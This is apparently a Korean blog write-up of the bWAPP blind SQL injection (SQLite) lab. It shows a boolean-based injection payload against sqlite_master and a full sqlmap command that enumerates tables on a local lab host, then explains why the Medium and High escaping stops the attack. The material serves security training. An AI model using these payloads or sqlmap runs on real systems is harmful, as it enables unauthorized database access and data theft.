---
layout: single
title: (bWAPP)SQL Injection - Blind (SQLite) (SQLMap)
categories: bwapp
tag: [sql injection, sql, injection, bwapp, bee box, GET, OWASP TOP 10, OWASP]
toc: true
author_profile: false
---

# 검증 로직
> Low Level 에서는 보안 대책이 적용되어 있지 않다.

## Level - Low

![그림 1-1](/assets/image/bwapp/injection/sqli-bilid-sqlitesqlmap/image.png)
- 앞서 실습한 일반적인 Boolean Based SQLI 이다.
- 하지만 DBMS가 SQLIte 라는 점을 유의해야한다.
- SQLIte의 경우 타 DBMS 와 다른 SQL 구문을 사용한다.

![그림 1-2](/assets/image/bwapp/injection/sqli-bilid-sqlitesqlmap/image-1.png)
- ‘(싱글쿼터) 입력시 Error 가 발생하는 것을 확인 할 수 있다.

![그림 1-3](/assets/image/bwapp/injection/sqli-bilid-sqlitesqlmap/image-2.png)
![그림 1-4](/assets/image/bwapp/injection/sqli-bilid-sqlitesqlmap/image-3.png)
- 참과 거짓에 따라 반환 값이 다르다.
- 일반적인 Boolean Based SQLI 이다.

```sql
' or 1=1 and length((select tbl_name from sqlite_master))=4--
```

![그림 1-5](/assets/image/bwapp/injection/sqli-bilid-sqlitesqlmap/image-4.png)
- SQLIte 문법에 맞게 현재 사용중인 테이블의 길이 값을 추출할 수 있다.
> 특정 우회기법이 존재 하지 않으므로, SQLMap 을 사용하여 빠르게 추출을 시도하였다.

```shell
sudo sqlmap -u 'http://192.168.146.133/bWAPP/sqli_14.php?title=&action=search' --cookie="PHPSESSID=96c12e3a77a8447a9e980c2825783943;security_level=0;BEEFHOOK=UhoQoFNoEivNNG7EheQSAIsf8yrWl2cCOaY1uXgrLizZDIE3F6QYDxbWZ3vLOnqtvLxBoUX7D3L6LmPP" --dbms=sqlite -p 'title' --threads=5 --level=5 --risk=3 --tables
```

![그림 1-6](/assets/image/bwapp/injection/sqli-bilid-sqlitesqlmap/image-5.png)
- sqlite의 경우  SQLMap 사용시 DBMS를 바로 지정 후 —tables를 통해 테이블을 바로 확인할 수 있다.
- 3개의 테이블을 확인하였으며 users 테이블에 대해 컬럼을 확인해 보았다.

- 이와같이 데이터추출까지 할 수 있다.


## Medium & High

```php
function sqli_check_1($data)
{
    return addslashes($data)
}

function sqli_check_2($data)
{
    return mysql_real_escape_string($data);
}
```

1. Medium Level 에서는 addslahes() 함수를 사용하여 ‘(싱글쿼터 )를 입력하게되면 \ 를 앞에 붙여 ‘(싱글쿼터) 사용을 막고 있다. 해당 search 구문인 ‘%%’ 로 이루어져 있어 공격이 성립되지 않는다.
2. High Level 에서는 mysql_real_escape_string() 함수를 사용하여 메타문자를 방지하고 있다.
3. 해당 문제에서 Medium 과 High Level은 공격이 성립되지 않는다.

